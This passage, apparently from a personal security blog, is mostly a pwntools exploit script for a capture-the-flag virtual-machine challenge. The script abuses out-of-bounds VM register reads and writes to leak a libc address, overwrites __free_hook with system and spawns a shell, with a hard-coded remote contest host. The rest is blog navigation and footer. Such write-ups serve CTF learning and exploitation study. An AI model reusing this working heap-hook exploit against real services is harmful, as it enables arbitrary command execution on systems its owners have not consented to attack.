class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0xF48)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(op))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov</span>(<span class="params">rx,data</span>):</span></span><br><span class="line">    payload = <span class="number">0x10000000</span> + rx*<span class="number">0x10000</span> + data</span><br><span class="line">    sl(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shl</span>(<span class="params">r1,r2,r3</span>):</span></span><br><span class="line">    payload = <span class="number">0xc0000000</span> + r1*<span class="number">0x10000</span> + r2*<span class="number">0x100</span> + r3</span><br><span class="line">    sl(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">r1,r2,r3</span>):</span></span><br><span class="line">    payload = <span class="number">0x70000000</span> + r1*<span class="number">0x10000</span> + r2*<span class="number">0x100</span> + r3</span><br><span class="line">    sl(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span>(<span class="params">r1,r2,r3</span>):</span></span><br><span class="line">    payload = <span class="number">0x80000000</span> + r1*<span class="number">0x10000</span> + r2*<span class="number">0x100</span> + r3</span><br><span class="line">    sl(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">0xf000000000</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">r1,r3</span>):</span></span><br><span class="line">    payload = <span class="number">0x30000000</span> + r1*<span class="number">0x10000</span> + r3</span><br><span class="line">    sl(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">r1,r3</span>):</span></span><br><span class="line">    payload = <span class="number">0x40000000</span> + r1*<span class="number">0x10000</span> + r3</span><br><span class="line">    sl(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;PC: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">sla(<span class="string">&quot;SP: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">sla(<span class="string">&quot;CODE SIZE: &quot;</span>,<span class="built_in">str</span>(<span class="number">24</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;CODE: &quot;</span>)</span><br><span class="line"></span><br><span class="line">mov(<span class="number">0</span>,<span class="number">1</span>)<span class="comment">#6</span></span><br><span class="line">mov(<span class="number">1</span>,<span class="number">62</span>)</span><br><span class="line">sub(<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">read(<span class="number">8</span>,<span class="number">2</span>)</span><br><span class="line">sub(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">read(<span class="number">9</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">mov(<span class="number">0</span>,<span class="number">0x60</span>)<span class="comment">#10</span></span><br><span class="line">mov(<span class="number">1</span>,<span class="number">0x22</span>)</span><br><span class="line">mov(<span class="number">3</span>,<span class="number">0x34</span>)</span><br><span class="line">mov(<span class="number">4</span>,<span class="number">8</span>)</span><br><span class="line">shl(<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line">mov(<span class="number">4</span>,<span class="number">16</span>)</span><br><span class="line">shl(<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">4</span>,<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">mov(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">mov(<span class="number">1</span>,<span class="number">8</span>)</span><br><span class="line">sub(<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">mov(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">write(<span class="number">10</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">write(<span class="number">8</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;R8: &quot;</span>)</span><br><span class="line">leak_addr1 = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">p.recvuntil(<span class="string">&quot;R9: &quot;</span>)</span><br><span class="line">leak_addr2 = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">leak_addr = leak_addr1 *<span class="number">0x100000000</span> + leak_addr2</span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free = libc_base + libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;free &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(system))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[+] free &gt;&gt; 0x7fa41010f540</span></span><br><span class="line"><span class="string">[+] free_hook &gt;&gt; 0x7fa4104517a8</span></span><br><span class="line"><span class="string">pwndbg&gt; distance 0x7fa41010f540 0x7fa4104517a8</span></span><br><span class="line"><span class="string">0x7fa41010f540-&gt;0x7fa4104517a8 is 0x342268 bytes (0x6844d words)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/30/">30</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">300</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">155</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.2m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">64:07</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
